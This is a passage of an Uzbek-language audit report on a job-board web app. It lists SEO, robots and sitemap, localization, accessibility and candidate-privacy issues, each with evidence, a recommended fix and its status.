- **Impact:** Bitta tushirib qoldirilgan yoki mos kelmagan env canonical, hreflang, og:url va JSON-LD'ni localhost'ga qaratadi yoki sitemap'ni canonical'dan boshqa host'da (masalan *.vercel.app va custom domen) chiqaradi. Google sitemap'ni e'tiborsiz qoldiradi yoki haqiqiy saytni indeksdan chiqaradi.
- **Evidence:** config.ts:21-22 `(import.meta.env.VITE_SITE_URL as string | undefined) || "http://localhost:3001"`; env.ts:47 `WEB_ORIGIN: z.string().default("http://localhost:5173")`; env.ts:130 superRefine faqat JWT sirlarini tekshiradi; seo.routes.ts:14 `PUBLIC_ORIGIN = env.WEB_ORIGIN`.
- **Recommended fix:** VITE_SITE_URL yo'q yoki localhost bo'lsa web production build'ini to'xtating. env.ts superRefine'da production uchun WEB_ORIGIN https va localhost bo'lmasligini talab qiling. Alohida PUBLIC_SITE_URL qo'shing yoki WEB_ORIGIN === VITE_SITE_URL ekanini deploy smoke-test bilan tekshiring (sitemap host = canonical host).
- **Severity izohi:** Tracker'da P3 edi (agent P2). P2 qilindi: noto'g'ri sozlama jimgina SEO'ni butunlay buzadi.
- **Manba topilmalar:** seo-10
- **Bajarilgan fix:** seo-10: PARTIAL — Web half fixed and verified: vite.config.ts fails the build when VITE_SITE_URL or VITE_API_URL is missing/localhost on Vercel or with STRICT_SITE_URL=1 (warning only for local buil
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-100

**robots.txt va sitemap yetkazilishi mo'rt: self-hosted'da umuman yo'q, Vercel'da API'ga bog'liq (timeout yo'q, robots uchun 5xx, sitemap yo'lida robots matni)**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-100
- **Area:** seo/robots
- **Fayl:** `apps/web/api/seo.js:39`
- **Root cause:** server/index.mjs'da /robots.txt va /sitemap*.xml marshruti yo'q, public/'da robots.txt ham yo'q. Vercel'dagi seo.js API'ga timeout'siz proxy qiladi, xatoda sitemap yo'llari uchun ham 502 va robots matnini qaytaradi, API_URL bo'lmasa esa 200 va robots matni.
- **Impact:** Self-hosted deploy'da sitemap topilmaydi va robots qoidalari yo'q. Vercel'da API ishlamasa robots.txt 5xx qaytaradi, Google bu vaqtda butun saytni crawl qilishni to'xtatadi. Sekin API funksiyani platforma timeout'igacha osiltiradi.
- **Evidence:** server/index.mjs:99 faqat `app.get("/*")` SSR handler; public/ ro'yxatida robots.txt yo'q; seo.js:39-41 `await fetch(`${API_URL}${pathname}`, { headers })` signal'siz; seo.js:52-56 502 va robots matni; seo.js:30-35 API_URL yo'q bo'lsa 200 robots matni.
- **Recommended fix:** Ma'lumotga bog'liq bo'lmagan robots.txt'ni web'dan statik bering. Faqat sitemap'larni proxy qiling: AbortSignal.timeout(~8s), xatoda 503 + Retry-After va XML content type. Xuddi shu proxy'ni server/index.mjs'ga qo'shing yoki self-hosted SEO uchun qo'llab-quvvatlanmasligini hujjatlang.
- **Severity izohi:** Tracker'da P3 edi. P2 qilindi: robots.txt 5xx butun sayt crawl'ini to'xtatadi.
- **Manba topilmalar:** seo-11
- **Bajarilgan fix:** seo-11: FIXED — Verified, not re-implemented: api/seo.js serves a data-independent robots.txt (static fallback when the API is down or unset, never 5xx), proxies sitemaps with 5/8 s timeouts and a
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-073

**Backend bildirishnomalari (sayt, qo'ng'iroq, push, Telegram, email) har bir foydalanuvchi uchun tayyor o'zbekcha matn sifatida saqlanadi va yuboriladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-073
- **Area:** i18n/notifications
- **Fayl:** `apps/api/src/modules/notifications/notifications.service.ts:104`
- **Root cause:** Chaqiruvchilar title, body, CTA va email HTML'ni tayyor o'zbekcha satr qilib quradi, notify() ularni o'zgarishsiz saqlaydi. Klient tarjima qila oladigan tipga xos parametrlar yo'q. User'da locale maydoni yo'q, email footer ham o'zbekcha qattiq yozilgan.
- **Impact:** RU/EN nomzod bildirishnomalar sahifasi, qo'ng'iroq, push, Telegram va email'da 'Ariza holati o'zgardi' kabi o'zbekcha matn oladi. Yuz minglab eski bildirishnoma qatorlarini keyin qayta tarjima qilib bo'lmaydi.
- **Evidence:** applications.routes.ts:32-37 STATUS_UZ; :357-366 title 'Ariza holati o'zgardi', ctaLabel 'Arizalarimni ko'rish'; notifications.service.ts:104-105 title/body saqlanadi; alerts.service.ts:213-225; chat.routes.ts:87 'Yangi xabar keldi'; mailer.ts:108-109 footer; schema.prisma'da locale maydoni yo'q; NotificationCard.tsx:45-46 xom ko'rsatadi.
- **Recommended fix:** Har tip uchun tuzilgan payload saqlang (vacancyTitle, status, count, searchName, reason). Sayt ichidagi matnni klient t.notificationsPage shablonlaridan chizsin, eski qatorlar uchun title/body fallback qolsin. User.locale qo'shing (login yoki til almashtirishda URL tilidan). Push, Telegram va email matnini server tomonidagi uz/ru/en lug'atidan quring va havolalarga til prefiksi qo'shing (ISSUE-103).
- **Severity izohi:** P2 saqlandi. ISSUE-073 NOT FIXED (D-031); havola prefiksi qismi ISSUE-103.
- **Manba topilmalar:** i18n-2
- **Bajarilgan fix:** i18n-2: PARTIAL — Same as realtime-10: all server-generated notifications I own carry an i18n key + params; external channels remain Uzbek by decision D-059.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-073

**Server xato matnlari (o'zbekcha AppError, inglizcha zod default) va qattiq yozilgan zaxira matnlar RU/EN interfeysda xom ko'rinadi; 'Xatolik' mantiq belgisi sifatida ishlatiladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-073
- **Area:** i18n/errors
- **Fayl:** `apps/api/src/server.ts:186`
- **Root cause:** API tayyor matn qaytaradi: o'zbekcha AppError yoki zod'ning inglizcha default'i bilan `${field}: ${issue.message}`. Web catch bloklari ko'p joyda err.message'ni har tilda chiqaradi. Zaxira matnlar t.* o'rniga inline yozilgan, ApiError default'i 'Xatolik', komponentlar esa err.message'ni shu so'z bilan solishtiradi.
- **Impact:** RU/EN foydalanuvchi 'Email yoki parol noto'g'ri' va 'password: String must contain at least 8 character(s)' kabi aralash tildagi texnik xabarlarni ko'radi. Tarmoq xatosida 'Xatolik yuz berdi', sharhda 'Nomzod'. Sentinel so'zni o'zgartirish xatolarni ishlashni jimgina buzadi.
- **Evidence:** server.ts:183-187 ZodError `${field}: ${issue.message}`; auth.routes.ts:17-18 xabarsiz email()/min(8); login/+Page.tsx:36, SocialLogin.tsx:60,114, TelegramConnect.tsx:85 `setError(err.message)`; EmployerCompanyForm.tsx:48,61,95 'Xatolik yuz berdi'; lib/api.ts:100,127 default 'Xatolik', :284 'Nomzod'; sentinel: ResumeFile.tsx:40, profile/ui.tsx:333; signup placeholder'lari :92,100.
- **Recommended fix:** API qaytaradigan `error` kodlaridan foydalaning va aniq kodlar qo'shing (INVALID_CREDENTIALS, EMAIL_TAKEN, RATE_LIMITED, BOT_OFFLINE...). VALIDATION_ERROR uchun {field, rule, min} bering. Web'da err.message o'rnini bosuvchi bitta umumiy helper kodlarni t.errors.* ga map qilsin, topilmasa umumiy lokal xabar. ApiError'ga fromServer bayrog'i qo'shing. Inline zaxira matnlarni t.* kalitlariga ko'chiring va signup parol maydoniga minLength={8} qo'shing.
- **Severity izohi:** P2. i18n-9 (P3) xuddi shu xato ko'rsatish mexanizmi va inline matn ildiziga birlashtirildi. ISSUE-073 va ISSUE-091 (R233) NOT FIXED.
- **Manba topilmalar:** i18n-3, i18n-9
- **Bajarilgan fix:** i18n-3: PARTIAL — One shared helper (apiErrorText in lib/apiExtra.ts, also backing lib/admin/useNotice.ts errorText) now decides the text: network/non-JSON failures get a translated retry message, r | i18n-9: PARTIAL — Fixed in owned files: SocialLogin's 'Xatolik yuz berdi' fallback now uses t.login.connError, and the hardcoded 'Aziz'/'Aliyev' signup placeholders were removed. Not owned: api.ts g
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-073

**API slug bermagan yoki web slug'ni tashlagan joylarda hudud va kategoriya nomlari RU/EN sahifalarda o'zbekcha chiqadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-073
- **Area:** i18n/catalog
- **Fayl:** `apps/web/src/components/companies/CompanyCard.tsx:101`
- **Root cause:** Lokalizatsiya slug bo'yicha qidiruvga (regionName(), CATEGORY_NAMES) tayanadi. Profil, candidates va chat javoblari faqat region.name qaytaradi; apiExtra mapVacancyRow va lib/api mapCompany slug'ni tashlaydi; salaries sahifasi slug bor bo'lsa ham API nomini chizadi.
- **Impact:** RU/EN foydalanuvchi bosh sahifa kartalari, /companies, profil sarlavhasi, rezyume ko'rinishi, nomzodlar ro'yxati, chat tafsilotlari va maosh jadvallarida 'Farg'ona', 'Qurilish, ko'chmas mulk' kabi nomlarni ko'radi. Xuddi shu sahifadagi boshqa kartalar lokallashtirilgan, shuning uchun sayt nomuvofiq ko'rinadi.
- **Evidence:** companies/CompanyCard.tsx:96-101 lib/api.ts:265 orqali (companies.list.ts:113 slug qaytaradi); components/VacancyCard.tsx:49 apiExtra.ts:94-101 dan; ProfileHeader.tsx:77 (profile.routes.ts:39 slug'siz); candidates/+Page.tsx:233,376; ConversationDetails.tsx:68,140; SalaryTables.tsx:106 (salary.stats.ts:156 slug bor). Lokallashtirilgani: vacancies/VacancyCard.tsx:36.
- **Recommended fix:** Profil, candidates va chat endpointlari region va category'ni {slug, name} ko'rinishida qaytarsin. mapVacancyRow va mapCompany slug'ni saqlasin. Hamma hudud va kategoriya yorlig'ini regionName(locale, slug, name) va categoryLabel() orqali chizing. Salaries'da nomni slug bo'yicha oling.
- **Severity izohi:** P2 saqlandi (ISSUE-073, R143, NOT FIXED).
- **Manba topilmalar:** i18n-4
- **Bajarilgan fix:** i18n-4: PARTIAL — Fixed inside the owned paths: mapVacancyRow keeps regionSlug, so saved-jobs cards localize; new regionDisplayName() localizes by slug or, when the API sends only the Uzbek name, by
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-075

**Markazdagi dialoglarda max-height va ichki scroll yo'q: telefonda tasdiqlash tugmalari ekrandan tashqarida qoladi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-075
- **Area:** responsive/a11y-dialogs
- **Fayl:** `apps/web/src/components/employer/applications/ApplicationStatusDialog.tsx:85`
- **Root cause:** Markazlashgan dialog varianti bottom-sheet dialoglardagi balandlik chegarasisiz ko'chirilgan. useDialog body scroll'ni qulflaydi, shuning uchun viewport'dan baland panelni umuman scroll qilib bo'lmaydi.
- **Impact:** Landscape telefon yoki ochiq klaviaturada taklif/qabul/rad etish, o'chirishni tasdiqlash va baho yuborish tugmasi viewport ostida qoladi va ish beruvchi amalni tugata olmaydi (WCAG 1.4.10).
- **Evidence:** ApplicationStatusDialog.tsx:71 overlay 'fixed inset-0 flex items-end ... p-4'; :85 panel 'w-full max-w-md animate-pop rounded-2xl ... p-5', max-h va overflow yo'q, ichida min-h-[88px] textarea; ConfirmDialog.tsx:55, RatingDialog.tsx:71, TeamList.tsx:175 xuddi shunday; useDialog.ts:28 body overflow hidden; ReportDialog.tsx:91 max-h-[92dvh] ishlatadi.
- **Recommended fix:** Bu panellarga 'max-h-[calc(100dvh-2rem)] overflow-y-auto overscroll-contain' qo'shing yoki ReportDialog kabi scroll qilinadigan tana va sticky footer'li flex-col tuzilma bering. Variantlar farqlanib ketmasligi uchun umumiy DialogPanel komponentini ajrating.
- **Severity izohi:** P2 saqlandi. ISSUE-075 PARTIAL; dialog overflow qismi tuzatilmagan.
- **Manba topilmalar:** a11y-ui-1
- **Bajarilgan fix:** a11y-ui-1: PARTIAL — ApplicationStatusDialog paneliga max-height + ichki scroll qo'shildi. ConfirmDialog.tsx, RatingDialog.tsx va TeamList.tsx mening fayllarim emas — needsOutside (umumiy DialogPanel h
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-075

**Custom Select va LanguageSwitcher: ko'rinadigan fokus yo'q, strelka tugmalari ishlamaydi, Escape fokusni body'ga tashlaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-075
- **Area:** a11y/keyboard
- **Fayl:** `apps/web/src/components/Select.tsx:51`
- **Root cause:** Sichqoncha uchun yozilgan popover listbox: umumiy useClickOutside Escape'da faqat yopadi va fokusni qaytarmaydi. Trigger'dagi focus:outline-none global :focus-visible outline'ni bekor qiladi, o'rniga hech narsa qo'yilmagan.
- **Impact:** Klaviatura foydalanuvchisi hudud, saralash va xodimlar soni maydonlarida fokusni ko'rmaydi, har bir variantdan Tab bilan o'tadi, Escape'dan keyin fokus hujjat boshiga sakraydi. Screen reader widget bajarmaydigan listbox semantikasini e'lon qiladi (WCAG 2.1.1, 2.4.7, 4.1.2).
- **Evidence:** Select.tsx:51 trigger `focus:outline-none`, focus-visible uslubi yo'q; :70-99 ul role=listbox > button role=option, onKeyDown va aria-activedescendant yo'q; useClickOutside.ts:19 `if (e.key === "Escape") onOutside();`; LanguageSwitcher.tsx:29,47-56, NotificationBell.tsx:31-35 xuddi shu naqsh; CompanyToolbar.tsx:54 va SearchBar.tsx:47 select'larda label yo'q.
- **Recommended fix:** Select'ni FieldSelect.tsx naqshidagi native <select> bilan almashtiring yoki to'liq WAI-ARIA listbox klaviatura modelini yozing. focus-visible ring qo'shing. useClickOutside'ga triggerRef qo'shib, Escape'da fokusni trigger'ga qaytaring. LanguageSwitcher'ni har variantda lang atributi bor havolalar sifatida quring. Saralash va hudud select'lariga aria-label bering.
- **Severity izohi:** P2 saqlandi. ISSUE-075 PARTIAL (R163): Select klaviaturasi va popover fokusi ochiq.
- **Manba topilmalar:** a11y-ui-2
- **Bajarilgan fix:** a11y-ui-2: PARTIAL — Select and LanguageSwitcher (the named components) are fully fixed: visible focus (focus:outline-none no longer kills :focus-visible), arrow keys/Home/End/Enter/Space, Escape close
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-076

**Rang kontrasti WCAG AA'dan past: tungi rejimda signal tokeni (hover 2.98:1), kunduzgi rejimda text-dusk/80, placeholder va rangli status badge'lari**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-076
- **Area:** a11y/contrast
- **Fayl:** `apps/web/src/styles/global.css:49`
- **Root cause:** Tokenlar indigo retheme'dan keyin qayta o'lchanmagan. Bitta --signal ham oq matn ostidagi fon, ham qorong'i yuzadagi matn rangi; tungi hover tokeni undan ham och. Kunduzgi rejimda o'rta kontrastli --dusk'ga opacity qo'llanadi, rangli fonlar esa gold-deep va growth kontrastini tushiradi.
- **Impact:** Tungi rejimda har bir asosiy CTA yorlig'i AA'dan past (hover'da 2.98:1), text-signal havolalar zo'rg'a o'qiladi, yashil badge'dagi oq belgi 2.01:1. Kunduzgi rejimda ikkilamchi metadata, placeholder'lar va ariza/moderatsiya status badge'lari past ko'rishli foydalanuvchiga qiyin (WCAG 1.4.3, 1.4.11).
- **Evidence:** global.css:49 `--signal: 99 102 241; /* #6366F1 — oq matn 4.9:1 ✓ */` (hisob 4.47), :50 --signal-strong #818CF8 (oq bilan 2.98); text-signal surface'da 3.96; dusk/80: surface'da 3.59, surface-2'da 3.34 (NotificationBell.tsx:146, AuthForm.tsx:82,124); gold-deep gold/15 ustida 4.47 (VacancyStatusBadge.tsx:8); growth growth/15 ustida 4.43; bg-growth + oq 2.01 (ProfileCompletion.tsx:49).
- **Recommended fix:** Tokenni ajrating: --signal-fill (tungi #4F46E5, oq matn 6.29:1, hover #4338CA) va --signal-text (tungi ~#A5B4FC). Matn va placeholder uchun alfasiz text-dusk ishlating. Kunduzgi --gold-deep'ni ~#9A4A08 ga to'qlashtiring yoki /10 tint qo'llang. bg-growth badge'larida dark:text-paper. global.css, tailwind.config.js va DESIGN.md'dagi eskirgan izohlarni tuzating va token kontrasti testini qo'shing.
- **Severity izohi:** P2. Ikkala xom topilma ISSUE-076 (NOT FIXED, D-031) ning bir qismi; 2.98:1 hover va growth badge'lari tracker'da yo'q edi. Dizayn tasdig'i kerak.
- **Manba topilmalar:** a11y-ui-5, a11y-ui-7
- **Bajarilgan fix:** a11y-ui-5: FIXED — The one-token-for-fill-and-text problem is resolved: dark --signal #5B52EA (white 5.47:1, 3.23:1 against surface), dark --signal-strong #4B43D9 (white 6.77:1, hover no longer 2.98: | a11y-ui-7: FIXED — text-dusk/80 (3.59:1) and /70 plus their placeholder variants now resolve to full --dusk (5.48:1 white / 4.91:1 surface-2); light --gold-deep #B45309→#9A4A08 (gold/15 5.58:1, gold/
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-077

**prefers-reduced-motion ataylab e'tiborsiz: bosh sahifa, employer va auth sahifalarida cheksiz animatsiyalarni to'xtatib bo'lmaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-077
- **Area:** a11y/motion
- **Fayl:** `apps/web/src/styles/global.css:419`
- **Root cause:** Brend qarori bilan harakat doim yoqilgan: reduced motion media query va pauza boshqaruvi yo'q.
- **Impact:** WCAG 2.2.2 (A) va 2.3.3 buziladi. Vestibulyar muammoli foydalanuvchilar landing va login sahifalarida katta suzuvchi bloblar va harakatlanuvchi gradient matnni to'xtata olmaydi. Arzon telefonlarda GPU va batareya sarflanadi.
- **Evidence:** global.css:419-420 izoh '...prefers-reduced-motion bilan animatsiya o'chirilmaydi' (faylda prefers-reduced-motion faqat shu izohda); :231-233 drift-a/b/c, :254 particle, :353 text-shine; HeroBackdrop.tsx:28-47; text-shine index/+Page.tsx:75, login/+Page.tsx:45; motion-reduce faqat SalaryDistributionChart.tsx:63 va SalaryExperienceChart.tsx:61.
- **Recommended fix:** @media (prefers-reduced-motion: reduce) blokida .drift-*, .particle, .text-shine, .breathe, .shimmer::after va kirish animatsiyalariga animation:none bering, .reveal-pending'ni opacity:1 va transform:none qiling, html scroll-behavior:auto. scrollIntoView chaqiruvlari uchun prefersReducedMotion() helper qo'shing. O'lik keyframe'larni o'chiring va egasining qarorini D-031 o'rniga yozing.
- **Severity izohi:** P2 saqlandi (ISSUE-077 NOT FIXED). A darajali WCAG talabi.
- **Manba topilmalar:** a11y-ui-6
- **Bajarilgan fix:** a11y-ui-6: FIXED — @media (prefers-reduced-motion: reduce) in global.css sets animation:none on drift-a/b/c, breathe, pulse-ring, spin-slow, text-shine, shimmer::after and every entrance animation (f
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-075

**StarInput tanlangan bahoni e'lon qilmaydi va faqat 1.77:1 rangga tayanadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-075
- **Area:** a11y/semantics
- **Fayl:** `apps/web/src/components/StarRating.tsx:44`
- **Root cause:** Baho kiritish sichqoncha uchun beshta oddiy tugma: radio semantikasi ham, tanlovning rangdan boshqa belgisi ham yo'q.
- **Impact:** Screen reader foydalanuvchisi kompaniya sharhi yoki bir martalik suhbat bahosida qaysi baho tanlanganini bilmaydi. Past ko'rishli foydalanuvchi kunduzgi rejimda to'la va bo'sh yulduzni zo'rg'a ajratadi (WCAG 4.1.2, 1.4.1, 1.4.11).
- **Evidence:** StarRating.tsx:38-51 beshta `<button aria-label={`${i}`}>`, aria-pressed/aria-checked va radio roli yo'q, nomlar faqat raqam; tanlov faqat `text-gold` va `text-line` rangida (1.77:1); hover faqat onMouseEnter; ishlatilishi: CompanyReviews.tsx:222, RatingDialog.tsx:104.
- **Recommended fix:** Radiogroup qiling: vizual yashirin native radio input'lar va i18n yorliqlar ('5 dan 4 yulduz'), yoki role=radio + aria-checked + roving tabindex. Tanlanmagan yulduzlarni text-dusk kontur bilan (kamida 3:1) chizing va yonida 'n/5' ko'rsating.
- **Severity izohi:** P2 saqlandi. ISSUE-075 PARTIAL (R164), bajarilmagan.
- **Manba topilmalar:** a11y-ui-8
- **Bajarilgan fix:** a11y-ui-8: FIXED — StarInput is a radiogroup with role=radio/aria-checked, roving tabindex and arrow/Home/End keys, names are "n / 5", unselected stars are ☆ in text-dusk (5.48:1) so state is not con
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-008

**Nomzodlar bazasi sukut bo'yicha ochiq: rezyume saqlash uni chop etadi, isOpenToWork default true, ish beruvchida telefon yoki kompaniya tasdig'i talab qilinmaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-008
- **Area:** privacy/candidates-db
- **Fayl:** `apps/api/src/modules/candidates/candidates.routes.ts:34`
- **Root cause:** Rezyumeni chop etish saqlashning yon ta'siri, ko'rinish esa sukut bo'yicha ochiq. /api/candidates faqat employer roli va ixtiyoriy kompaniya yozuvini talab qiladi: requirePhoneVerified, kompaniya tasdig'i va kvota yo'q. D-012 kontaktlarni yashirgan, ism va to'liq rezyumeni ochiq qoldirgan.
- **Impact:** Faqat shaxsiy ariza yubormoqchi bo'lgan nomzodning ham ismi, sarlavhasi, hududi, kutilgan maoshi va to'liq ish/ta'lim tarixi ro'yxatdan o'tgan va faqat nom yozgan har qanday 'ish beruvchi'ga ochiq. U 200x50 sahifa orqali ~10k nomzodni yig'ib oladi. Bu 'shaxsiy ma'lumot'mi, egasining ta'rifiga bog'liq (taxmin).
- **Evidence:** resume.routes.ts:140 har PUT'da `status: "published"`; schema.prisma:219 `isOpenToWork Boolean @default(true)`; candidates.routes.ts:34 preHandler faqat requireAuth + requireRole; :37-40 kompaniya mavjudligi; :11 MAX_PAGE=200, pageSize ≤50; :73-84 include ism va to'liq rezyume; companies.routes.ts:40 PUT faqat nom talab qiladi; chat.routes.ts:294 start esa requirePhoneVerified.
- **Recommended fix:** Topilishni aniq opt-in qiling: isOpenToWork default false yoki ResumeWizard'da 'ish beruvchilarga ko'rinadi' rozilik qadami. 'Saqlangan' va 'chop etilgan' holatlarini ajrating. /api/candidates'ga requirePhoneVerified (yoki tasdiqlangan kompaniya), foydalanuvchi bo'yicha kunlik kvota va profil ko'rish auditini qo'shing. Nomzod ariza bermaguncha familiyaning faqat bosh harfini ko'rsatishni ko'rib chiqing.
- **Severity izohi:** P2, ishonch o'rtacha. Ikki topilma bitta endpoint ildiziga birlashtirildi. ISSUE-008 root cause'ida phone gate yo'qligi yozilgan, fix faqat kontaktlarni yashirgan. Egasi rezyume mazmunini shaxsiy ma'lumot deb hisoblasa — P1.
- **Manba topilmalar:** candidate-flows-9, employer-flows-7
- **Bajarilgan fix:** employer-flows-7: FIXED — D-071: telefon tasdig'i + 300/soat kvota. Kompaniya tasdig'i talab qilinmadi (mahsulot qarori emas, brief'da yo'q); aloqa qoidalari (D-012) o'zgarmadi.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-066

**Vakansiya sahifasidan (Ariza/Saqlash) va saqlangan qidiruvdan mehmon login qilsa qaytish manzili yo'qoladi va bosh sahifaga tushadi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** PARTIAL
- **Mavjud tracker:** ISSUE-066
- **Area:** ux/candidate-funnel
- **Fayl:** `apps/web/src/components/vacancies/detail/VacancyDetailView.tsx:48`
- **Root cause:** Apply-card va saqlash havolalari loginHrefWithReturn o'rniga oddiy l('/login') bilan quriladi. Signup returnTo'ni umuman ishlatmaydi.
- **Impact:** Eng yuqori niyatli mehmon oqimi — vakansiyani ochish, Ariza bosish, kirish yoki ro'yxatdan o'tish — foydalanuvchini / yoki /profile'ga tashlaydi va u vakansiyani qaytadan qidiradi. Ariza voronkasi uziladi.
- **Evidence:** VacancyDetailView.tsx:48 `login: l("/login")`, :49 `signup: l("/signup")` — ApplyCard.tsx:84 va useApplication 401 yo'naltirishlarida ishlatiladi; SaveSearchButton.tsx:80 `l('/login')`; login/+Page.tsx:34 `returnTargetOr(l("/"))`; signup/+Page.tsx:34 `done = () => ...assign(l(role === "employer" ? "/employer" : "/profile"))`.
- **Recommended fix:** Detail sahifa, saqlangan qidiruv va useApplication yo'naltirishida loginHrefWithReturn ishlating. Signup'dagi done() returnTo'ni hisobga olsin va Google signup'ga ham uzatilsin.
- **Severity izohi:** P2 saqlandi. ISSUE-066 PARTIAL: returnTo faqat guard va profil yo'naltirishlarida qo'shilgan.
- **Manba topilmalar:** candidate-flows-12
- **Bajarilgan fix:** candidate-flows-12: PARTIAL — Vacancy detail now builds login/signup links with loginHrefWithReturn (client-side only, so hydration is unchanged); this covers the guest Apply CTA, the signup prompt, the guest S
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-029

**Nomzodning PDF rezyumesi /uploads/ orqali autentifikatsiyasiz yuklab olinadi va hech qachon bekor qilinmaydi**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-029
- **Area:** privacy/uploads
- **Fayl:** `apps/api/src/server.ts:174`
- **Root cause:** Rezyumelar logo va muqovalar bilan bitta ochiq static /uploads/ papkasida. Kirishni faqat taxmin qilib bo'lmaydigan fayl nomi himoya qiladi.
- **Impact:** Rezyume URL'i ish beruvchiga yetgach, uni forward yoki scrape qilish mumkin va rad etilgandan, vakansiya yopilgandan yoki nomzod open-to-work'ni o'chirgandan keyin ham havola ishlayveradi. PDF'da ko'pincha telefon va manzil bo'ladi.
- **Evidence:** server.ts:174 `app.register(fastifyStatic, { root: UPLOAD_DIR, prefix: "/uploads/" })` auth hook'siz (163-172 onSend faqat CSP/nosniff); profile.routes.ts:109 `/uploads/resume-<32hex>.pdf`; applications.routes.ts:294 employer'ga resumeUrl; fayl faqat almashtirish yoki o'chirishda o'chiriladi.
- **Recommended fix:** Rezyumeni autentifikatsiyali endpoint orqali bering: nomzodning o'zi, uning vakansiyasiga arizasi bor ish beruvchi yoki admin. Qisqa muddatli imzolangan URL ishlating va resume- fayllarini ochiq static ildizdan chiqaring. Mavjud URL'lar uchun migratsiya yoki moslik redirect'i kerak.
- **Severity izohi:** P2 saqlandi. ISSUE-029 PARTIAL: nom tasodifiy, lekin fayl hali ham URL'ni bilgan har kimga ochiq (D-013).
- **Manba topilmalar:** candidate-flows-13
- **Bajarilgan fix:** candidate-flows-13: FIXED — The permanent bearer URL is gone; deleting the resume still unlinks the file, and a revoked/blocked account fails requireAuth.
- **Test/dalil:** PHASE 5: e2e 120/120, auth 49/49, web unit OK (haqiqatda ishga tushirilgan)

### R3 ISSUE-045

**Arizalar ish maydoni eng yangi 2000 ta bilan cheklangan, har biri to'liq rezyume bilan; filtr, son va qidiruv client'da**

- **Severity:** P2
- **Verification:** UNVERIFIED (mustaqil verify bajarilmadi — quyidagi izohga qarang)
- **Holat:** FIXED
- **Mavjud tracker:** ISSUE-045
- **Area:** scale/employer-applications
- **Fayl:** `apps/api/src/modules/applications/applications.routes.ts:219`
- **Root cause:** GET /api/employer/applications eng yangi 2000 qatorni har biri to'liq rezyume (tajriba, ta'lim, ko'nikma), holat tarixi va kontaktlar bilan qaytaradi; server filtri va sahifalash yo'q. Web bir marta yuklab, xotirada filtrlaydi va sanaydi. Vakansiya bo'yicha endpoint (limit 500) web'da ishlatilmaydi.
- **Impact:** 2000 dan ko'p arizasi bor ish beruvchi eskilarini ocha, qidira va holatini o'zgartira olmaydi. ?vacancy= havolasi va status tab sonlari faqat shu qismni qamraydi. Tracker benchmark'i: 5000 arizada p50 ~3.5 s va 2.6 MB, mobil tarmoqda yanada sekin.
- **Evidence:** applications.routes.ts:29 `EMPLOYER_LIST_LIMIT = 2000`; :185-216 to'liq resume include; :219 `take: EMPLOYER_LIST_LIMIT`; EmployerApplicationsView.tsx:108-110 `filterApplications`/`statusCounts` useMemo ichida; web faqat /api/employer/applications'ni chaqiradi.
- **Recommended fix:** Serverga status, vacancyId, q, period va sort parametrlari hamda cursor sahifalash (≤50) qo'shing, ro'yxat uchun yengil select bering. Rezyume, tarix va kontaktlar talab bo'yicha GET /api/applications/:id (egalik tekshiruvi bilan) orqali yuklansin. Status sonlarini [vacancyId, status] bo'yicha groupBy bilan hisoblang.
- **Severity izohi:** P2 saqlandi. ISSUE-045 PARTIAL: server sahifalash qilinmagan, benchmark yaxshilanmagan.
